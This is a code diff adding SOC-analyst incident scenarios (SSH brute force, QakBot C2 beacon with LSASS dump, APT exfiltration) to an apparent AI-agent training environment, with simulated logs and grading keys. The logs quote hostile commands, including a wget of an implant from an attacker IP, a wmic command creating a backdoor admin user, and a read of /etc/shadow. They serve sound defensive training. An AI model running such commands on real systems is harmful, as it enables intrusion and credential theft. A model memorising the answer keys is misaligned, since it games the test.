@@ -6,12 +6,15 @@ team performs daily: cost anomaly investigation (FinOps), security posture
 remediation, and live incident response — combined into three progressively
 harder tasks.
 
-Task difficulty:
-  easy   — FinOps: billing spike from zombie EC2 instances (1 root cause, 15 steps)
-  medium — Security + SRE: S3 public exposure + broken service IAM (2 root causes, 25 steps)
-  hard   — DDoS + FinOps + SRE: live attack, WAF deployment via Terraform,
-           runaway auto-scaling cost ($50k/hr), cascading service failures
-           (3 root causes, 40 steps)
+Task difficulty — CloudOps track:
+  easy      — FinOps: billing spike from zombie EC2 instances (1 root cause, 15 steps)
+  medium    — Security + SRE: S3 public exposure + broken service IAM (2 root causes, 25 steps)
+  hard      — DDoS + FinOps + SRE: live attack, WAF Terraform, auto-scaling runaway (3 root causes, 40 steps)
+
+Task difficulty — SOC Analyst track:
+  soc_easy  — SecOps: brute-force SSH → account compromise (1 root cause, 15 steps)
+  soc_medium— SecOps: QakBot C2 beacon + LSASS credential dump (2 root causes, 25 steps)
+  soc_hard  — SecOps: APT — active C2 + lateral movement + S3 exfiltration (3 root causes, 40 steps)
 
 Action space (all text-based — no spatial grids, no physics):
   view_logs(service)                         — service log output
@@ -1177,6 +1180,629 @@ SCENARIOS: Dict[str, dict] = {
         "max_steps": 40,
         "difficulty": "hard",
     },
+
+    # ── SOC Analyst track ──────────────────────────────────────────────────
+
+    "soc_easy": {
+        "title": "SOC Alert #SOC-2847 — Brute-Force SSH → Successful Account Compromise",
+        "domain": "SecOps / SOC",
+        "initial_alert": (
+            "SIEM ALERT [CRITICAL] SOC-2847 | 2024-03-15T02:17:44Z\n"
+            "Rule: SSH Brute-Force Success\n"
+            "Source IP: 185.220.101.45 (Tor exit node)\n"
+            "Target: bastion-host-prod (10.0.1.50)\n"
+            "Events: 247 failed SSH attempts in 4 min → 1 SUCCESSFUL LOGIN\n"
+            "User: svc_deploy | Last login: never from this IP\n"
+            "MITRE ATT&CK: T1110 (Brute Force) → T1078 (Valid Accounts)\n"
+            "\nAction required: Investigate, triage, and remediate."
+        ),
+        "services": {
+            "bastion_host": {
+                "status": "degraded",
+                "error_rate_pct": 0.0,
+                "response_time_ms": 95.0,
+                "uptime_pct": 99.7,
+                "logs": (
+                    "[02:12:14] sshd: Failed password for svc_deploy from 185.220.101.45 port 51230\n"
+                    "[02:12:15] sshd: Failed password for svc_deploy from 185.220.101.45 port 51231\n"
+                    "[02:12:16] sshd: Failed password for svc_deploy from 185.220.101.45 port 51232\n"
+                    "... (247 failed attempts over 4 minutes) ...\n"
+                    "[02:17:44] sshd: Accepted password for svc_deploy from 185.220.101.45 port 51489\n"
+                    "[02:17:44] sshd: pam_unix(sshd:session): session opened for user svc_deploy\n"
+                    "[02:17:47] sudo: svc_deploy : TTY=pts/0 ; PWD=/home/svc_deploy ; USER=root ; "
+                    "COMMAND=/usr/bin/id\n"
+                    "[02:17:51] sudo: svc_deploy : TTY=pts/0 ; PWD=/ ; USER=root ; "
+                    "COMMAND=/usr/bin/wget http://185.220.101.45:8080/implant.sh"
+                ),
+                "metrics": {
+                    "active_sessions": 2,
+                    "auth_failures_per_min": 61.75,
+                    "suspicious_commands": ["wget", "id", "whoami", "cat /etc/shadow"],
+                },
+            },
+            "auth_service": {
+                "status": "degraded",
+                "error_rate_pct": 12.4,
+                "response_time_ms": 340.0,
+                "uptime_pct": 97.3,
+                "logs": (
+                    "[02:17:44] AUTH: Login success — user=svc_deploy ip=185.220.101.45 "
+                    "session_token=eyJhbGc.ATTACKER_SESSION.xK3mNqP\n"
+                    "[02:17:52] AUTH: Privilege escalation attempt — user=svc_deploy → root\n"
+                    "[02:18:01] AUTH: API key enumeration detected — user=svc_deploy\n"
+                    "[02:18:14] AUTH: 12 API requests to /internal/secrets endpoint\n"
+                    "[02:18:31] AUTH: Alert — svc_deploy accessing ci_cd_pipeline_key\n"
+                ),
+                "metrics": {
+                    "failed_logins_1h": 251,
+                    "suspicious_sessions": ["eyJhbGc.ATTACKER_SESSION.xK3mNqP"],
+                    "api_abuse_score": 0.94,
+                },
+            },
+        },
+        "threat_indicators": {
+            "malicious_ips": ["185.220.101.45"],
+            "intel": {
+                "185.220.101.45": {
+                    "type": "Tor Exit Node",
+                    "confidence": "HIGH",
+                    "feeds": ["Spamhaus DROP", "AbuseIPDB", "dan.me.uk/torlist"],
+                    "asn": "AS205100 (F3 Netze e.V.)",
+                    "country": "DE",
+                    "tags": ["tor-exit", "brute-force", "scanner"],
+                    "abuse_score": 97,
+                    "last_reported": "2024-03-15T02:00:00Z",
+                    "description": (
+                        "Known Tor exit node used extensively for brute-force campaigns. "
+                        "Listed on Spamhaus DROP and AbuseIPDB with abuse confidence score 97/100."
+                    ),
+                    "recommended_action": (
+                        "Immediately revoke active session, block IP at network level. "
+                        "Rotate all credentials accessed by compromised user."
+                    ),
+                },
+            },
+        },
+        "cli_outputs": {
+            "aws sts get-caller-identity": (
+                "{\n"
+                '  "UserId": "AIDA:svc_deploy",\n'
+                '  "Account": "123456789012",\n'
+                '  "Arn": "arn:aws:iam::123456789012:user/svc_deploy"\n'
+                "}"
+            ),
+            "last -n 20": (
+                "svc_deploy pts/0  185.220.101.45  Fri Mar 15 02:17  still logged in\n"
+                "admin     pts/1  10.0.0.15       Fri Mar 15 00:03 - 00:47 (00:44)\n"
+            ),
+            "who": "svc_deploy pts/0  2024-03-15 02:17 (185.220.101.45)",
+        },
+        "root_causes": ["compromised_bastion_access"],
+        "correct_fixes": {
+            "compromised_bastion_access": {
+                "target": "bastion_host",
+                "fix_types": [
+                    "revoke_session", "block_ip", "terminate_session",
+                    "kill_session", "disconnect", "ban",
+                ],
+                "config_keys": [
+                    "session_token", "eyjahlgc", "attacker_session", "xk3mnqp",
+                    "185.220.101.45", "svc_deploy", "block", "revoke",
+                    "tor", "compromised",
+                ],
+                "success_message": (
+                    "✅ SOC-2847 REMEDIATED\n"
+                    "Attacker session eyJhbGc.ATTACKER_SESSION.xK3mNqP has been revoked.\n"
+                    "IP 185.220.101.45 blocked at security group and NACL level.\n"
+                    "User svc_deploy forced MFA re-enrollment.\n"
+                    "SIEM: Alert closed — CONFIRMED TRUE POSITIVE."
+                ),
+            },
+        },
+        "verify_services": ["bastion_host"],
+        "post_fix_status": {
+            "bastion_host": {
+                "status": "healthy",
+                "error_rate_pct": 0.0,
+                "response_time_ms": 80.0,
+                "uptime_pct": 100.0,
+            },
+            "auth_service": {
+                "status": "healthy",
+                "error_rate_pct": 0.1,
+                "response_time_ms": 120.0,
+                "uptime_pct": 99.9,
+            },
+        },
+        "max_steps": 15,
+        "difficulty": "soc_easy",
+    },
+
+    "soc_medium": {
+        "title": "SOC Alert #SOC-3991 — QakBot C2 Beacon + LSASS Credential Dump",
+        "domain": "SecOps / SOC",
+        "initial_alert": (
+            "SIEM ALERT [CRITICAL] SOC-3991 | 2024-03-15T09:42:07Z\n"
+            "Correlated alerts (3 rules fired simultaneously):\n"
+            "  [1] C2 Beacon: ENG-WORKSTATION-47 → 162.243.103.246:8080 (HTTP POST /gate.php)\n"
+            "      Interval: every 60s | First seen: 08:15 | Pattern: QakBot\n"
+            "  [2] LSASS Memory Access: PID 4892 (malware.exe) accessed lsass.exe\n"
+            "      MITRE T1003.001 (OS Credential Dumping: LSASS Memory)\n"
+            "  [3] Lateral movement probe: ENG-WORKSTATION-47 scanning 10.0.2.0/24 SMB\n"
+            "MITRE ATT&CK chain: T1566 (Phishing) → T1055 (Injection) → T1003 (Cred Dump)\n"
+            "\nAffected host: ENG-WORKSTATION-47 (user: eng.martinez)\n"
+            "Action required: Contain host, assess credential exposure."
+        ),
+        "services": {
+            "endpoint_security": {
+                "status": "degraded",
+                "error_rate_pct": 0.0,
+                "response_time_ms": 0.0,
+                "uptime_pct": 100.0,
+                "logs": (
+                    "[08:15:03] EDR: Suspicious process — malware.exe (PID 4892) "
+                    "parent: winword.exe (phishing doc)\n"
+                    "[08:15:04] EDR: Process injection — malware.exe → explorer.exe\n"
+                    "[08:15:22] EDR: C2 beacon — ENG-WORKSTATION-47 → 162.243.103.246:8080 "
+                    "POST /gate.php (QakBot signature)\n"
+                    "[08:16:01] EDR: LSASS memory read — PID 4892 → lsass.exe (CREDENTIAL DUMP)\n"
+                    "[08:16:15] EDR: Credentials harvested — NTLM hashes extracted (est. 8 accounts)\n"
+                    "[08:22:07] EDR: Network scan — ENG-WORKSTATION-47 scanning 10.0.2.0/24:445\n"
+                    "[09:42:07] SIEM: Correlation rule fired — C2_BEACON + LSASS_DUMP + LATERAL_PROBE"
+                ),
+                "metrics": {
+                    "infected_hosts": ["ENG-WORKSTATION-47"],
+                    "c2_connections": 88,
+                    "credentials_at_risk": 8,
+                    "lateral_probe_targets": 254,
+                },
+            },
+            "auth_service": {
+                "status": "degraded",
+                "error_rate_pct": 8.3,
+                "response_time_ms": 520.0,
+                "uptime_pct": 95.2,
+                "logs": (
+                    "[08:16:20] AUTH: Pass-the-Hash attempt — eng.martinez → SRV-SQL-01\n"
+                    "[08:16:21] AUTH: NTLM auth failure (wrong hash) — eng.martinez → SRV-FILE-02\n"
+                    "[08:17:44] AUTH: Successful NTLM auth — eng.martinez → SRV-BUILD-03 "
+                    "(LATERAL MOVEMENT)\n"
+                    "[08:18:01] AUTH: eng.martinez downloading build artifacts from SRV-BUILD-03\n"
+                    "[09:40:00] AUTH: Accounts flagged as potentially compromised:\n"
+                    "  eng.martinez, svc_cicd, admin_backup, db_readonly, "
+                    "svc_monitoring, sys_audit, dev_api, qa_tester"
+                ),
+                "metrics": {
+                    "compromised_accounts": [
+                        "eng.martinez", "svc_cicd", "admin_backup", "db_readonly",
+                        "svc_monitoring", "sys_audit", "dev_api", "qa_tester",
+                    ],
+                    "pass_the_hash_attempts": 14,
+                    "successful_lateral_auths": 1,
+                },
+            },
+            "email_gateway": {
+                "status": "down",
+                "error_rate_pct": 100.0,
+                "response_time_ms": 0.0,
+                "uptime_pct": 0.0,
+                "logs": (
+                    "[08:14:55] MAIL: Delivered — phishing@attacker.ru → eng.martinez "
+                    "(subject: 'Q1 Invoice_Final.docx')\n"
+                    "[08:14:57] MAIL: Attachment opened — Invoice_Final.docx (macro enabled)\n"
+                    "[09:42:07] MAIL: Gateway suspended — awaiting malware analysis completion"
+                ),
+            },
+            "network_ids": {
+                "status": "degraded",
+                "error_rate_pct": 3.2,
+                "response_time_ms": 45.0,
+                "uptime_pct": 98.1,
+                "logs": (
+                    "[08:15:22] IDS: Rule ET TROJAN QakBot CnC Beacon — "
+                    "10.0.2.47:51204 → 162.243.103.246:8080\n"
+                    "[08:22:07] IDS: Rule ET SCAN SMB Lateral Movement — "
+                    "10.0.2.47:49152 → 10.0.2.0/24:445\n"
+                    "[08:23:15] IDS: High-volume internal SMB — suppressed after 500 events\n"
+                    "[09:41:55] IDS: Alert threshold reached — operator review required"
+                ),
+            },
+        },
+        "threat_indicators": {
+            "malicious_ips": ["162.243.103.246"],
+            "intel": {
+                "162.243.103.246": {
+                    "type": "Botnet C2 — QakBot/Emotet",
+                    "confidence": "HIGH",
+                    "feeds": ["abuse.ch Feodo Tracker", "ET OPEN", "MISP"],
+                    "malware_family": "QakBot",
+                    "asn": "AS14061 (DigitalOcean)",
+                    "country": "US",
+                    "tags": ["c2", "qakbot", "botnet", "active"],
+                    "last_seen": "2024-03-15T09:40:00Z",
+                    "description": (
+                        "Active QakBot/Emotet C2 server. "
+                        "Port 8080, path /gate.php is canonical QakBot callback. "
+                        "Listed on abuse.ch Feodo Tracker as ONLINE."
+                    ),
+                    "recommended_action": (
+                        "Isolate infected host immediately. "
+                        "Block C2 IP at perimeter. "
+                        "Rotate all credentials on the affected domain segment."
+                    ),
+                },
+            },
+        },
+        "cli_outputs": {
+            "ss -tp | grep :8080": (
+                "ESTAB 0 0 10.0.2.47:51204 162.243.103.246:8080 "
+                'users:(("malware.exe",pid=4892,fd=3))'
+            ),
+            "ps aux | grep malware": "root 4892 malware.exe (parent: winword.exe PID 4881)",
+            "netstat -an | grep 162.243.103.246": (
+                "tcp 0 0 10.0.2.47:51204 162.243.103.246:8080 ESTABLISHED"
+            ),
+        },
+        "correct_fixes": {
+            "malware_c2_beacon": {
+                "target": "endpoint_security",
+                "fix_types": [
+                    "isolate_host", "quarantine", "contain", "network_isolate",
+                    "isolate", "block_host",
+                ],
+                "config_keys": [
+                    "eng-workstation-47", "workstation", "eng.martinez",
+                    "4892", "malware", "infected", "quarantine", "isolate",
+                    "qakbot", "c2", "162.243.103.246",
+                ],
+                "success_message": (
+                    "✅ HOST ISOLATED — ENG-WORKSTATION-47\n"
+                    "Network access revoked at hypervisor level.\n"
+                    "C2 beacon to 162.243.103.246:8080 terminated.\n"
+                    "EDR snapshot captured for forensics.\n"
+                    "Ticket: IR-3991-A opened for malware analysis."
+                ),
+            },
+            "credential_dump": {
+                "target": "auth_service",
+                "fix_types": [
+                    "revoke_credentials", "reset_passwords", "force_mfa",
+                    "rotate_secrets", "invalidate_tokens", "revoke",
+                ],
+                "config_keys": [
+                    "compromised_accounts", "eng.martinez", "svc_cicd",
+                    "admin_backup", "db_readonly", "all", "ntlm",
+                    "pass_the_hash", "credentials", "hashes",
+                ],
+                "success_message": (
+                    "✅ CREDENTIALS ROTATED — 8 accounts remediated\n"
+                    "Accounts force-reset: eng.martinez, svc_cicd, admin_backup, "
+                    "db_readonly, svc_monitoring, sys_audit, dev_api, qa_tester\n"
+                    "NTLM hashes invalidated across AD.\n"
+                    "MFA re-enrollment enforced for all 8 accounts.\n"
+                    "Pass-the-hash lateral path to SRV-BUILD-03 blocked."
+                ),
+            },
+        },
+        "root_causes": ["malware_c2_beacon", "credential_dump"],
+        "verify_services": ["endpoint_security", "auth_service"],
+        "post_fix_status": {
+            "endpoint_security": {
+                "status": "healthy",
+                "error_rate_pct": 0.0,
+                "response_time_ms": 0.0,
+                "uptime_pct": 100.0,
+            },
+            "auth_service": {
+                "status": "healthy",
+                "error_rate_pct": 0.2,
+                "response_time_ms": 145.0,
+                "uptime_pct": 99.9,
+            },
+            "email_gateway": {
+                "status": "healthy",
+                "error_rate_pct": 0.0,
+                "response_time_ms": 80.0,
+                "uptime_pct": 100.0,
+            },
+            "network_ids": {
+                "status": "healthy",
+                "error_rate_pct": 0.0,
+                "response_time_ms": 35.0,
+                "uptime_pct": 100.0,
+            },
+        },
+        "max_steps": 25,
+        "difficulty": "soc_medium",
+    },
+
+    "soc_hard": {
+        "title": (
+            "SOC Alert #SOC-4128 — APT: Active QakBot C2 + Lateral Movement "
+            "+ S3 Data Exfiltration"
+        ),
+        "domain": "SecOps / SOC",
+        "initial_alert": (
+            "SIEM ALERT [CRITICAL] SOC-4128 | 2024-03-15T14:33:19Z\n"
+            "APT MULTI-STAGE INCIDENT — 5 correlated rules:\n"
+            "  [1] Active C2 Beacon: PROD-SRV-12 → 50.16.16.211:443 (TLS/HTTPS)\n"
+            "      Malware: QakBot | Beacon interval: 300s | Duration: 6h 14m\n"
+            "      MITRE T1071.001 (Application Layer Protocol: Web Protocols)\n"
+            "  [2] Lateral movement: PROD-SRV-12 → PROD-SRV-07, PROD-SRV-09, DB-PRIMARY\n"
+            "      Protocol: SMB/WMI | MITRE T1021 (Remote Services)\n"
+            "  [3] CloudTrail anomaly: iam_role/DataScienceRole — 2.3 GB S3 GetObject\n"
+            "      Bucket: s3://prod-data-lake-analytics | Duration: 47 min\n"
+            "      MITRE T1530 (Data from Cloud Storage Object)\n"
+            "  [4] IAM anomaly: DataScienceRole API calls from new IP 50.16.16.211\n"
+            "      MITRE T1078 (Valid Accounts — compromised role credentials)\n"
+            "  [5] GuardDuty: UnauthorizedAccess:IAMUser/TorIPCaller on DataScienceRole\n"
+            "\nScope: 4 internal servers compromised, 2.3 GB data exfiltrated\n"
+            "THREAT LEVEL: CRITICAL — Active APT, ongoing exfiltration\n"
+            "Action required: Block C2, contain lateral movement, revoke S3 access."
+        ),
+        "services": {
+            "endpoint_security": {
+                "status": "degraded",
+                "error_rate_pct": 0.0,
+                "response_time_ms": 0.0,
+                "uptime_pct": 100.0,
+                "logs": (
+                    "[08:19:08] EDR: Suspicious beacon — PROD-SRV-12 → 50.16.16.211:443\n"
+                    "           TLS SNI: update.microsoft-patch.net (domain fronting suspected)\n"
+                    "[08:19:15] EDR: QakBot DLL side-loading — svchost.exe (PID 2847)\n"
+                    "[10:32:44] EDR: WMI execution — PROD-SRV-12 → PROD-SRV-07\n"
+                    "           Command: wmic /node:PROD-SRV-07 process call create "
+                    "'cmd.exe /c net user backdoor P@ssw0rd! /add'\n"
+                    "[10:35:12] EDR: SMB admin share access — PROD-SRV-12 → DB-PRIMARY\\\\C$\n"
+                    "[12:45:03] EDR: Large data staging — PROD-SRV-12 staging 2.5 GB to %TEMP%\n"
+                    "[14:33:19] EDR: Exfiltration confirmed — 2.3 GB via AWS CLI to S3 bucket\n"
+                    "           from DataScienceRole (credential stolen from PROD-SRV-12)"
+                ),
+                "metrics": {
+                    "infected_hosts": ["PROD-SRV-12", "PROD-SRV-07", "PROD-SRV-09", "DB-PRIMARY"],
+                    "c2_duration_minutes": 374,
+                    "data_staged_gb": 2.5,
+                    "lateral_targets_compromised": 3,
+                },
+            },
+            "network_ids": {
+                "status": "degraded",
+                "error_rate_pct": 2.8,
+                "response_time_ms": 55.0,
+                "uptime_pct": 97.4,
+                "logs": (
+                    "[08:19:10] IDS: Rule ET TROJAN QakBot SSL Cert — "
+                    "10.0.3.12:52847 → 50.16.16.211:443\n"
+                    "[10:32:48] IDS: Rule ET LATERAL WMI Remote Exec — "
+                    "10.0.3.12 → 10.0.3.7, 10.0.3.9, 10.0.4.1\n"
+                    "[14:10:15] IDS: High-volume egress — 10.0.3.12 → 3.5.7.14 (AWS S3)\n"
+                    "[14:33:19] IDS: DLP alert — 2.3 GB transferred outside VPC\n"
+                    "ALERT: C2 traffic to 50.16.16.211 must be blocked at NACL level"
+                ),
+                "metrics": {
+                    "c2_packets": 4482,
+                    "lateral_smb_events": 347,
+                    "egress_gb": 2.3,
+                    "active_c2_ip": "50.16.16.211",
+                },
+            },
+            "auth_service": {
+                "status": "degraded",
+                "error_rate_pct": 5.7,
+                "response_time_ms": 380.0,
+                "uptime_pct": 96.8,
+                "logs": (
+                    "[10:32:50] AUTH: New backdoor user created — PROD-SRV-07 "
+                    "(WMI lateral movement)\n"
+                    "[12:47:22] AUTH: DataScienceRole assumed from PROD-SRV-12 "
+                    "(STOLEN credentials)\n"
+                    "[12:47:25] AUTH: 1,847 S3 GetObject calls from DataScienceRole\n"
+                    "[14:33:10] AUTH: IAM session for DataScienceRole MUST BE REVOKED\n"
+                    "           Session: AQoXnyC4alenEXAMPLE (active since 12:47)"
+                ),
+                "metrics": {
+                    "stolen_role": "DataScienceRole",
+                    "iam_session": "AQoXnyC4alenEXAMPLE",
+                    "s3_api_calls": 1847,
+                },
+            },
+            "s3_data_lake": {
+                "status": "degraded",
+                "error_rate_pct": 0.0,
+                "response_time_ms": 55.0,
+                "uptime_pct": 100.0,
+                "logs": (
+                    "[12:47:25] S3: GetObject — s3://prod-data-lake-analytics/customer_pii/...\n"
+                    "[12:47:25] S3: GetObject — s3://prod-data-lake-analytics/financials/q4_2023\n"
+                    "... (1,845 more GetObject events in 47 min) ...\n"
+                    "[13:34:18] S3: Total transferred: 2.3 GB (customer PII + financial data)\n"
+                    "[14:33:19] CloudTrail: GuardDuty finding — "
+                    "UnauthorizedAccess:S3/TorIPCaller\n"
+                    "CRITICAL: Bucket policy must revoke DataScienceRole access"
+                ),
+                "metrics": {
+                    "objects_accessed": 1847,
+                    "data_exfiltrated_gb": 2.3,
+                    "sensitive_paths": [
+                        "customer_pii/", "financials/q4_2023/", "ml_training_data/"
+                    ],
+                },
+            },
+            "active_directory": {
+                "status": "degraded",
+                "error_rate_pct": 4.1,
+                "response_time_ms": 220.0,
+                "uptime_pct": 97.9,
+                "logs": (
+                    "[10:32:54] AD: New local admin created — user='backdoor' on PROD-SRV-07\n"
+                    "[10:33:00] AD: Scheduled task created — 'WindowsUpdate' on PROD-SRV-07\n"
+                    "[10:35:18] AD: Admin share access — DB-PRIMARY\\\\C$ from PROD-SRV-12\n"
+                    "[12:45:00] AD: Kerberoastable service account accessed — svc_sql\n"
+                    "[14:33:19] AD: 3 persistence mechanisms detected across domain"
+                ),
+            },
+        },
+        "threat_indicators": {
+            # Will be enriched by _load_real_data() with live Feodo entry
+            "malicious_ips": ["50.16.16.211"],
+            "intel": {
+                "50.16.16.211": {
+                    "type": "Botnet C2 — QakBot (ONLINE)",
+                    "confidence": "CRITICAL",
+                    "feeds": ["abuse.ch Feodo Tracker", "ET OPEN", "CISA AA23-075A"],
+                    "malware_family": "QakBot",
+                    "asn": "AS14618 (Amazon AWS)",
+                    "country": "US",
+                    "port": 443,
+                    "tags": ["c2", "qakbot", "apt", "active", "tls-beacon"],
+                    "first_seen": "2024-03-14T21:05:00Z",
+                    "last_seen": "2024-03-15T14:30:00Z",
+                    "status": "ONLINE",
+                    "description": (
+                        "ACTIVE QakBot C2 server (status: ONLINE per Feodo Tracker). "
+                        "Port 443, TLS-encrypted beacon every 300s. "
+                        "Associated with ransomware pre-cursor campaigns. "
+                        "Domain fronting via Microsoft CDN suspected."
+                    ),
+                    "recommended_action": (
+                        "IMMEDIATE: Block 50.16.16.211 via aws_network_acl Terraform. "
+                        "Then isolate all infected hosts. "
+                        "Then revoke DataScienceRole IAM session AQoXnyC4alenEXAMPLE."
+                    ),
+                },
+            },
+        },
+        "cli_outputs": {
+            "aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,"
+            "AttributeValue=GetObject": (
+                "Found 1847 GetObject events\n"
+                "Principal: arn:aws:sts::123456789012:assumed-role/DataScienceRole/session\n"
+                "Source IP: 50.16.16.211 (← same as C2!)\n"
+                "Total bytes: 2,468,741,120 (2.3 GB)\n"
+                "First event: 2024-03-15T12:47:25Z\n"
+                "Last event:  2024-03-15T13:34:18Z"
+            ),
+            "aws guardduty list-findings": (
+                "Finding: UnauthorizedAccess:IAMUser/TorIPCaller\n"
+                "  Severity: HIGH (8.9)\n"
+                "  Principal: DataScienceRole\n"
+                "  Source IP: 50.16.16.211\n"
+                "Finding: Backdoor:EC2/C&CActivity.B\n"
+                "  Severity: CRITICAL (9.5)\n"
+                "  Instance: PROD-SRV-12 (i-0abc123def456)\n"
+                "  C2 IP: 50.16.16.211:443"
+            ),
+            "aws ec2 describe-network-acls": (
+                "NetworkAcl: acl-0abc123\n"
+                "  Entries: [allow all inbound, allow all outbound]\n"
+                "  NOTE: No block rule for 50.16.16.211 — deploy aws_network_acl via Terraform"
+            ),
+        },
+        "correct_fixes": {
+            "active_c2_beacon": {
+                "target": "network_ids",
+                "fix_types": [
+                    "write_terraform", "block_ip_acl", "block_c2",
+                    "block_ip", "network_acl", "nacl",
+                ],
+                "config_keys": [
+                    "50.16.16.211",
+                    "aws_network_acl",   # agent uses resource_type="aws_network_acl"
+                    "network_acl",
+                    "block",
+                    "c2_ip",
+                    "qakbot",
+                    "port_443",
+                    "nacl",
+                ],
+                "success_message": (
+                    "✅ C2 CHANNEL SEVERED — 50.16.16.211 BLOCKED\n"
+                    "AWS Network ACL deployed: DENY 50.16.16.211/32 ALL traffic\n"
+                    "QakBot beacon from PROD-SRV-12 terminated.\n"
+                    "IDS: C2 traffic rule suppressed — no further callbacks.\n"
+                    "Terraform state: aws_network_acl.c2_block applied successfully."
+                ),
+            },
+            "lateral_movement": {
+                "target": "endpoint_security",
+                "fix_types": [
+                    "isolate_host", "quarantine", "contain",
+                    "network_isolate", "isolate_all", "block_host",
+                ],
+                "config_keys": [
+                    "prod-srv-12", "prod-srv-07", "prod-srv-09", "db-primary",
+                    "infected_hosts", "all_infected", "compromised",
+                    "lateral", "isolate", "quarantine",
+                ],
+                "success_message": (
+                    "✅ LATERAL MOVEMENT CONTAINED\n"
+                    "Isolated: PROD-SRV-12, PROD-SRV-07, PROD-SRV-09, DB-PRIMARY\n"
+                    "Network ACLs applied — no further SMB/WMI lateral path.\n"
+                    "Backdoor user 'backdoor' on PROD-SRV-07 disabled.\n"
+                    "Forensic snapshots captured for all 4 hosts.\n"
+                    "Ticket: IR-4128-B opened for re-imaging."
+                ),
+            },
+            "s3_data_exfiltration": {
+                "target": "s3_data_lake",
+                "fix_types": [
+                    "revoke_access", "revoke_iam", "deny_role",
+                    "block_role", "restrict_bucket", "revoke_credentials",
+                    "fix_iam", "block_public_access",
+                ],
+                "config_keys": [
+                    "datasciencerole", "data_science_role", "iam_session",
+                    "aqoxnyc4alenexample", "compromised_iam_role",
+                    "s3_data_lake", "bucket_policy", "deny", "revoke",
+                    "exfiltration", "role",
+                ],
+                "success_message": (
+                    "✅ S3 EXFILTRATION STOPPED\n"
+                    "IAM session AQoXnyC4alenEXAMPLE revoked immediately.\n"
+                    "DataScienceRole denied on s3://prod-data-lake-analytics (explicit Deny).\n"
+                    "S3 Object Lock enabled on customer_pii/ prefix.\n"
+                    "GuardDuty finding closed — no further unauthorized S3 access.\n"
+                    "DLP alert escalated to Data Protection Officer for breach assessment."
+                ),
+            },
+        },
+        "root_causes": ["active_c2_beacon", "lateral_movement", "s3_data_exfiltration"],
+        "verify_services": ["network_ids", "endpoint_security", "s3_data_lake"],
+        "post_fix_status": {
+            "endpoint_security": {
+                "status": "healthy",
+                "error_rate_pct": 0.0,
+                "response_time_ms": 0.0,
+                "uptime_pct": 100.0,
+            },
+            "network_ids": {
+                "status": "healthy",
+                "error_rate_pct": 0.1,
+                "response_time_ms": 40.0,
+                "uptime_pct": 99.9,
+            },
+            "auth_service": {
+                "status": "healthy",
+                "error_rate_pct": 0.2,
+                "response_time_ms": 130.0,
+                "uptime_pct": 99.8,
+            },
+            "s3_data_lake": {
+                "status": "healthy",
+                "error_rate_pct": 0.0,
+                "response_time_ms": 45.0,
+                "uptime_pct": 100.0,
+            },
+            "active_directory": {
+                "status": "healthy",
+                "error_rate_pct": 0.0,
+                "response_time_ms": 180.0,
+                "uptime_pct": 99.9,
+            },
+        },
+        "max_steps": 40,
+        "difficulty": "soc_hard",
+    },
 }
 
 # ---------------------------------------------------------------------------
@@ -1357,8 +1983,77 @@ def _load_real_data() -> None:
             found = len(techniques)
             print(f"[data] ✓ MITRE ATT&CK: {found} technique(s) injected "
                   f"into scenario alerts ({list(techniques.keys())})")
+
+            # Enrich SOC scenarios with matching MITRE techniques
+            soc_mitre_map = {
+                "soc_easy":   ["T1110", "T1078"],   # Brute Force, Valid Accounts
+                "soc_medium": ["T1566", "T1055", "T1003"],  # Phishing, Injection, Cred Dump
+                "soc_hard":   ["T1071", "T1021", "T1530", "T1078"],  # C2, Lateral, S3, ValidAcct
+            }
+            for task, tids in soc_mitre_map.items():
+                if task not in SCENARIOS:
+                    continue
+                mitre_lines = []
+                for tid in tids:
+                    tech = techniques.get(tid, {})
+                    if tech:
+                        tname = tech.get("name", tid)
+                        tactics = ", ".join(tech.get("tactics", []))
+                        mitre_lines.append(f"  {tid} {tname}" + (f" [{tactics}]" if tactics else ""))
+                if mitre_lines:
+                    SCENARIOS[task]["initial_alert"] += (
+                        "\n\nMITRE ATT&CK Techniques confirmed:\n" + "\n".join(mitre_lines)
+                    )
         except Exception as e:
             print(f"[data] ✗ MITRE ATT&CK load error: {e}")
+
+    # ── 5. Feodo Tracker — enrich SOC scenario threat_indicators with live C2 data ──
+    feodo_path = data_dir / "feodo_c2_ips.json"
+    if feodo_path.exists():
+        try:
+            feodo_data = json.loads(feodo_path.read_text())
+            records: list = feodo_data.get("records", [])
+
+            # Index by IP for O(1) lookup
+            feodo_index: dict = {r["ip_address"]: r for r in records if "ip_address" in r}
+
+            # SOC medium: 162.243.103.246 (QakBot/Emotet C2)
+            soc_m = SCENARIOS.get("soc_medium", {})
+            if "threat_indicators" in soc_m:
+                for ip in list(soc_m["threat_indicators"].get("malicious_ips", [])):
+                    entry = feodo_index.get(ip)
+                    if entry:
+                        soc_m["threat_indicators"]["intel"][ip].update({
+                            "status": entry.get("status", "offline"),
+                            "first_seen": entry.get("first_seen", ""),
+                            "last_online": entry.get("last_online", ""),
+                            "malware_family": entry.get("malware", "QakBot"),
+                            "port": entry.get("port", 8080),
+                            "country": entry.get("country", "US"),
+                            "_source": "abuse.ch Feodo Tracker (live)",
+                        })
+                        print(f"[data] ✓ Feodo: enriched soc_medium threat_intel for {ip} "
+                              f"(status={entry.get('status')})")
+
+            # SOC hard: 50.16.16.211 (QakBot C2, ONLINE)
+            soc_h = SCENARIOS.get("soc_hard", {})
+            if "threat_indicators" in soc_h:
+                for ip in list(soc_h["threat_indicators"].get("malicious_ips", [])):
+                    entry = feodo_index.get(ip)
+                    if entry:
+                        soc_h["threat_indicators"]["intel"][ip].update({
+                            "status": entry.get("status", "offline"),
+                            "first_seen": entry.get("first_seen", ""),
+                            "last_online": entry.get("last_online", ""),
+                            "malware_family": entry.get("malware", "QakBot"),
+                            "port": entry.get("port", 443),
+                            "country": entry.get("country", "US"),
+                            "_source": "abuse.ch Feodo Tracker (live)",
+                        })
+                        print(f"[data] ✓ Feodo: enriched soc_hard threat_intel for {ip} "
+                              f"(status={entry.get('status')})")
+        except Exception as e:
+            print(f"[data] ✗ Feodo Tracker load error: {e}")
 
 
 # Run at import time — silently skips if data/ files are missing
@@ -1374,6 +2069,7 @@ AVAILABLE_ACTIONS = [
     "list_resources",
     "run_cli",
     "view_billing",
+    "lookup_threat_intel",
     "apply_fix",
     "write_terraform",
     "verify",
@@ -1432,13 +2128,26 @@ class IncidentResponseEnvironment(Environment):
         self._done = False
         self._escalated = False
 
+        domain = self._scenario.get("domain", "").lower()
+        if "secops" in domain or "soc" in domain:
+            investigation_hint = (
+                "Begin triage. Use view_logs and run_cli to read SIEM data, "
